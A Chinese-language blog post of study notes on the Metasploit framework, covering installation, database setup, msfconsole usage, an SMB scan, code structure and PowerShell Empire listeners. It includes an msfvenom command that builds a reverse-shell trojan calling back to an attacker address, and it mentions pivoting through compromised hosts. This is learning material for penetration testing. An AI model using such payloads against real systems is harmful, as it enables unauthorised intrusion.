---
layout: post
title: Metasploit
permalink: msf
---

使用的版本：metasploit v4.14.12-dev。

Metasploit 将渗透测试的过程标准化自动化，每一步都有相应的代码对应，并提供了基础库，可以很方便的扩展。

它是一个渗透测试的集大成者，即是工具，有时学习的框架。

# 安装

- 使用 [kali Linux](https://www.kali.org/)
- 从[代码](https://github.com/rapid7/metasploit-framework)安装开发版，这里有[官方参考](https://github.com/rapid7/metasploit-framework/wiki/Setting-Up-a-Metasploit-Development-Environment)，下面是精简版：
  - git clone https://github.com/rapid7/metasploit-framework.git
  - cd metasploit-framework && bundle
    - 先安装以下包，用于编译安装相应的 gem
      - libpq-dev，用于 pg gem
      - libpcap-dev，用于 pcaprub gem
      - libsqlite3-dev
  - 初始化数据库：
    - 安装 PostgresSQL： sudo apt-get install postgresql
    - 配置 /etc/postgresql/9.x/main/pg_hba.conf local 为 trust，这样省得设置秘密了
    - 进 psql 创建用户：
      - sudo su - postgres
      - create user msfdev with createdb;
    - 在 ~/.msf4/database.yml 配置数据库：

```coffee
development: &pgsql
  adapter: postgresql
  database: msf_dev_db
  username: msfdev
  host: localhost
  port: 5432
  pool: 5
  timeout: 5

# Production database -- same as dev
production: &production
  <<: *pgsql
  database: msf_production_db

# Test database -- not the same, since it gets dropped all the time
test:
  <<: *pgsql
  database: msf_test_db

```

  - 就可以执行啦： ./msfconsole
- [安装社区版](https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers)。

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall
```

上面的代码其实是下载最新的匹配安装包，把 Metasploit 安装到 /opt/metasploit-framework 目录下，然后将里面的 bin 目录加到 PATH 里。

之后就可以：

```bash
# 进入命令行
msfconsole
```

需要更新的话在 shell 里运行：

```bash
# 更新
msfupdate
```

## 配置
不管开发板还是社区版，配置文件在 $HOME/.msf4 下，可以去设置数据库等。

### 数据库
首先数据库不是必须的，但它很有用，能加快 search 和 存储结果。

启动 msfconsole 是首先会检查 $HOME/.msf4/db 目录，如果存在就会运行那里面的数据库程序，否则使用系统 PostgreSQL。

但无论用哪个数据库，数据库配置文件都是像 Rails 一样在配置 .msf4/database.yml 文件里配置。而且默认它们都是用的 **production** 的数据库配置，但可以在启动时通过 --environment 参数来选择环境。其实共用影响不大，因为主要起到索引，而且它是增量的。我喜欢用开发环境，因为可以直接 git pull 来升级 modules 里的内容，而不像 msfupdate 那样重新安装一遍。

```bash
# lib/metasploit/framework/parsed_options/base.rb
# If RAILS_ENV is set, then it will be used, but if RAILS_ENV is set and the --environment option is given, then
# --environment value will be used to reset ENV[RAILS_ENV].
options.environment = ENV['RAILS_ENV'] || DEFAULT_ENVIRONMENT
```

第一次打开 msfconsole，它会自动创建数据库的。不修改 database.yml 的情况下，第一次启动，它发现没有数据库，会默认创建 db 目录的。

也可以在外部创建 .msf4/db 下的数据库：

```bash
$ msfdb init

After the database starts, you can use any of the following commands to manage the database:
msfdb reinit: Deletes and reinitializes the database.
msfdb delete: Deletes the database.
msfdb start: Starts the database.
msfdb stop: Stops the database.
msfdb status: Shows the database status.
```

其实这样将 MSF 的数据库单独存放挺好的，和自己使用的不冲突。在打开 msfconsole 时才打开数据库服务，启动嵌入的数据库  /opt/metasploit-framework/embedded/bin/postgres，并监听 5433 端口，但退出时不会自动关闭。（PostgreSQL 数据库服务并没有什么特别之处，一个可执行文件加配置文件就可以嵌入进来）

如果显示 'Module database cache not built yet, using slow search'，则需要更新查找缓存：

```bash
msf > db_rebuild_cache
```

有了数据库，就有了 workspace 来存数据了。

[这里](https://www.offensive-security.com/metasploit-unleashed/using-databases/)有更详细用法。

### 自定义
可以在 $HOME/.msf4 的以下目录自定义相应的内容：

- modules
- plugins
- loot

然后在 msfconsole 中重新加载：

```bash
reload_all
```


## 其它命令

- msfvenom 木马生成

```bash
# 生成一个木马程序
msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=192.168.0.1 LPORT=443 -b "\x00" -f elf -o /tmp/evil/evil
```

# 基础

- target 待攻击目标
- exploit 利用漏洞，攻破目标的漏洞利用方式
- payload 有效载荷，一般是 shellcode，攻破目标后载入从而获得进一步控制


# 使用

msfconsole 主要使用步骤：

- scan 扫描目标
- search 找到合适的 exploit
- use 选择漏洞
- show options 查看需要设置的参数
- set 设置参数
  - PAYLOAD  攻击后执行的载荷
  - RHOST(S) 目标地址
  - THREADS
  - LHOST    攻击者的 IP
  - LPORT    攻击者的 端口
- exploit(run) 攻击
- post 进一步控制

## 一个例子
进入命令行：

```bash
msfconsole
```


exploit 都存在 modules/exploits 目录里。

使用时，在命令行里：

```
msf > use  exploit/windows/smb/ms09_050_smb2_negotiate_func_index
msf exploit(ms09_050_smb2_negotiate_func_index) > help
...snip...
Exploit Commands
================

    Command       Description
    -------       -----------
    check         Check to see if a target is vulnerable
    exploit       Launch an exploit attempt
    pry           Open a Pry session on the current module
    rcheck        Reloads the module and checks if the target is vulnerable
    reload        Just reloads the module
    rerun         Alias for rexploit
    rexploit      Reloads the module and launches an exploit attempt
    run           Alias for exploit

msf exploit(ms09_050_smb2_negotiate_func_index) >
```

- [一个简单的例子](https://www.offensive-security.com/metasploit-unleashed/shell/)
- [构造 deb 安装包来安装木马](https://www.offensive-security.com/metasploit-unleashed/binary-linux-trojan/)

## Scan —— 扫描
Scanners and most other auxiliary modules use the RHOSTS option instead of RHOST. RHOSTS can take IP ranges (192.168.1.20-192.168.1.30), CIDR ranges (192.168.1.0/24), multiple ranges separated by commas (192.168.1.0/24, 192.168.3.0/24), and line separated host list files (file:/tmp/hostlist.txt). This is another use for our grepable Nmap output file.

Note also that, by default, all of the scanner modules will have the THREADS value set to ‘1’. The THREADS value sets the number of concurrent threads to use while scanning. Set this value to a higher number in order to speed up your scans or keep it lower in order to reduce network traffic but be sure to adhere to the following guidelines:

Keep the THREADS value under 16 on native Win32 systems
Keep THREADS under 200 when running MSF under Cygwin
On Unix-like operating systems, THREADS can be set to 256.

扫描 smb 版本：

```bash
msf > use auxiliary/scanner/smb/smb_version
msf auxiliary(smb_version) > set RHOSTS 192.168.1.200-210
RHOSTS => 192.168.1.200-210
msf auxiliary(smb_version) > set THREADS 11
THREADS => 11
msf auxiliary(smb_version) > run
```

## Search

# Meterpreter


# 编写自己的 exploit

做到极简隐秘等，并尽量利用已有的库：

-Capture – sniff network packets
-Lorcon – send raw WiFi frames
-MSSQL – talk to Microsoft SQL servers
-KernelMode – exploit kernel bugs
-SEH – structured exception handling
-NDMP – the network backup protocol
-EggHunter – memory search
-FTP – talk to FTP servers
-FTPServer – create FTP servers

只需要继承相应的类，重写 initialize 和 run、exploit 和 check 方法。

- initialize 编写相关信息和需要提供的参数等等
- check 判断是否存在当前的漏洞
- run 执行，默认绑定 exploit
- exploit 利用

并且 Metasploit 提供了很多好用的库，比如 TCP 网络链接的，编码的，模糊测试的等等。


# 代码分析

## 目录结构

```
data: Metasploit 使用的可以编辑的文件。
documentation: 具体的开发使用文档。
external: 源码及第三方库。
lib: 构建 Metasploit 框架的“肉”
modules: 真正的 MSF modules
  - auxiliary 没有 payload 的 exploit
  - exploit 攻击
  - payload 打开最小缺口
  - post 攻击后的进一步操作，比如权限提升、种马等
plugins: 在运行时可以载入的插件
scripts: Meterpreter 以及其它脚本
tools: 多种有用的命令行集合
```

## Libraries

The MSF libraries help us to run our exploits without having to write additional code for rudimentary tasks, such as HTTP requests or encoding of payloads.

### 0: Rex
The framework was designed to be as modular as possible in order to encour- age the re-use of code across various projects. The most fundamental piece of the architecture is the Rex library which is short for the Ruby Extension Library. Some of the components provided by Rex include a wrapper socket subsystem, implementations of protocol clients and servers, a logging subsys- tem, exploitation utility classes, and a number of other useful classes. Rex itself is designed to have no dependencies other than what comes with the default Ruby install. In the event that a Rex class depends on something that is not included in the default install, the failure to find such a dependency should not lead to an inability to use Rex.

- The basic library for most tasks
- Handles sockets, protocols, text transformations, and others
- SSL, SMB, HTTP, XOR, Base64, Unicode

### 1: Msf::Core

- Provides the ‘basic’ API
- Defines the Metasploit Framework

### 2: Msf::Base

- Provides the ‘friendly’ API
- Provides simplified APIs for use in the Framework

# [metasploit-omnibus](https://github.com/rapid7/metasploit-omnibus) —— 安装包制作

使用的是修改过的 Chef 的 [omnibus](https://github.com/chef/omnibus)。

不仅是 Metasploit 的代码，更是它这一套构建流程及嵌入 nmap、postgresql、ruby 等等运行环境打包进去的思想，最后自动生成一个跨平台可安装包。

看 Linux 下 Metasploit 的安装目录  /opt/metasploit-framework/

```bash
├── bin
│   ├── metasploit-aggregator
│   ├── msfbinscan
│   ├── msfconsole
│   ├── msfd
│   ├── msfdb
│   ├── msfelfscan
│   ├── msfmachscan
│   ├── msfpescan
│   ├── msfremove
│   ├── msfrop
│   ├── msfrpc
│   ├── msfrpcd
│   ├── msfupdate
│   └── msfvenom
├── embedded
│   ├── bin
│   ├── framework
│   ├── include
│   ├── lib
│   ├── postgresql-prev
│   ├── share
│   └── ssl
```

主要两个目录：

- bin 目录： shell 的接口程序。
- embedded 目录： 使用 omnibus 打包进来的程序。
  - bin: Metasploit 执行时用到的执行文件
  - framework: Metasploit 的 代码
  - include: 头
  - lib: 库
  - postgresql-prev
  - share
  - ssl

看一下 bin/msfconsole 的前几行：

```bash
#!/bin/sh
cmd=`basename $0`

CWD=`pwd`
SCRIPTDIR=/opt/metasploit-framework/bin
cd $SCRIPTDIR
EMBEDDED=$SCRIPTDIR/../embedded
BIN=$EMBEDDED/bin
FRAMEWORK=$EMBEDDED/framework

LOCALCONF=~/.msf4
DB=$LOCALCONF/db
DBCONF=$LOCALCONF/database.yml
cd $CWD

# ...

unset GEM_HOME
unset GEM_PATH
unset GEM_ROOT
unset RUBY_ENGINE
unset RUBY_ROOT
PATH=$BIN:$SCRIPTDIR:$PATH
if [ -e "$FRAMEWORK/$cmd" ]; then
  $BIN/ruby $FRAMEWORK/$cmd $db_args "$@"
else
  $BIN/ruby $BIN/$cmd $db_args "$@"
fi

```

可见首先就是设置环境变量，最后用设置的环境来执行 framework 里的代码。这些应该都是 omnibus 做的。

还是信息论的概念，对于一个系统，我们只要提供了足够必要的信息，剩下的就可以自动完成了。

# 相关
## [Empire](http://www.powershellempire.com/)
Empire is a pure PowerShell post-exploitation agent built on cryptologically-secure communications and a flexible architecture. Empire implements the ability to run PowerShell agents without needing powershell.exe, rapidly deployable post-exploitation modules ranging from key loggers to Mimikatz, and adaptable communications to evade network detection, all wrapped up in a usability-focused framework. It premiered at BSidesLV in 2015.

这里主要对 listener 说明：

- native   本地的，此时 Host 只能是本机的 ip 地址，否则报 Error:99
- pivot    在肉鸡上开一个端口，通过这个端口进行操作
- hop      生成一个 hop.php 页面，肉鸡去那里获得 Host 地址
- foreign  将 Host 链到一起
- meter    中间的虚拟的，可以随意起 Host，只为提供 Host 信息

那么问题来了，如果将 Host 设置为自己路由后的 ip 呢？首先用 native 打开监听，然后在生成一 meter 指向路由的 ip，当然还需要做端口映射。
# 感想


# 参考
- https://www.offensive-security.com/metasploit-unleashed/
- https://community.rapid7.com/docs/DOC-3163
- https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial
